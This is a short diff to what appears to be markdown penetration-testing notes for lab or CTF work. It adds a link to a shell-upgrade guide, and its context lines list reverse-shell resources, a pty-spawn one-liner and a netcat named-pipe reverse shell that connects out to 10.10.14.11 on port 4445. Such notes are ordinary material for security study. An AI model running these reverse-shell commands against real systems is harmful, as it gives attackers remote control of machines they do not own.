@@ -6,6 +6,7 @@
 - [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - List of remote shells in various languages
 - [NetCat without -e](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/) - Reverse shell spawning when netcat does not support `-e`
 - [Exploit DB](https://www.exploit-db.com/) - Exploit DB
+- [Shell Upgrade Guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
 
 ## Tools
 
@@ -44,3 +45,4 @@ echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py && python /tmp/shell.p
 ```bash
 rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.11 4445 1>/tmp/backpipe
 ```
+
